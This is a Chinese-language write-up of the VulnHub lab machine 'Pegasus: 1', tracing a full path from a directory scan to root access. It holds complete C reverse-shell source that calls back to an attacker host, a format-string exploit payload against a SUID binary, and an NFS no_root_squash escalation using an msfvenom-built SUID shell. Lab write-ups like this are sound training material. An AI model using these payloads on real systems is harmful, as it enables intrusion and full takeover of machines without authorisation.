# Pegasus: 1

2024-12-28 https://www.vulnhub.com/entry/pegasus-1,109/

## IP

192.168.10.152

## Scan

```
PORT      STATE SERVICE
22/tcp    open  ssh
111/tcp   open  rpcbind
8088/tcp  open  radan-http
32821/tcp open  unknown
```

先看 8088 web，首页是张图片，看看有没有隐写，没有发现隐写，html 源码中也无信息。

进行目录扫描：

```
ffuf -t 100 -ac -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion -recursion-depth 1 -e .php -u http://192.168.10.152:8088/FUZZ
```

发现 submit.php 文件，访问后提示：No data to process. 应该是一个接收提交的 php 接口，但是没构造出来访问参数，可能还有其他的页面没有被扫描出来，使用大字典，找到了另外一个页面: codereview.php, 这个页面就是提交数据到 submit.php 上。

使用 bp 抓包，然后发送到 Repeater 上，进行测试，没有发现 sql 注入，也没有文件包含，在看看有没有 RCE，发现有提示：

```
code=system('ls')

Sorry, due to security precautions, Mike won't review any code containing system() function call.
```

说明对执行函数有过滤，看着像是 PHP 的语法，但是尝试其他命令执行函数后，都不行，可能不是 php 语言。

尝试 c 语言，找到 reverse shell 的代码，修改 ip 和端口，并且在 kali 上建立监听：

```
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ================================================== */
/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
/* ================================================== */
#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP (char*)"192.168.10.3"
# define CLIENT_PORT (int)8888
#endif
/* ================================================== */

int main(void) {
	if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
		write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
		return (1);
	}

	pid_t pid = fork();
	if (pid == -1) {
		write(2, "[ERROR] fork failed.\n", 21);
		return (1);
	}
	if (pid > 0) {
		return (0);
	}

	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(CLIENT_PORT);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);
	int sockt = socket(AF_INET, SOCK_STREAM, 0);

#ifdef WAIT_FOR_CLIENT
	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		sleep(5);
	}
#else
	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		return (1);
	}
#endif

	dup2(sockt, 0);
	dup2(sockt, 1);
	dup2(sockt, 2);
	char * const argv[] = {"/bin/sh", NULL};
	execve("/bin/sh", argv, NULL);

	return (0);
}
```

上传后，瞬间得到了反弹的 shell，先用 python 升级下 tty。

发现自定义 suid 程序：/home/mike/my_first，对其进行反编译，发现存在字符串溢出漏洞攻击 printf(format) ，经过测试，实现利用的 payload：

```
ln -s /bin/sh Selection:
export PATH=.:$PATH
(printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n'; cat) | ./my_first
```

最终得到了 john 的 shell。sudo -l 发现：(root) NOPASSWD: /usr/local/sbin/nfs ，并且发现 nfs 的配置文件有漏洞 no_root_squash：

```
/opt/nfs	*(rw,sync,crossmnt,no_subtree_check,no_root_squash)
```

启动 nfs，在 kali 上挂载，并且传入一个 root 权限的 suid 程序，从而得到了 root 权限：

目标机器上启动：

```
sudo nfs start
```

kali 上操作：

```
mount 192.168.10.152:/opt/nfs /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
sudo chown root /tmp/nfs/shell.elf
sudo chmod +xs /tmp/nfs/shell.elf
```

然后在目标机器上执行 shell.elf 就得到了 root 权限。
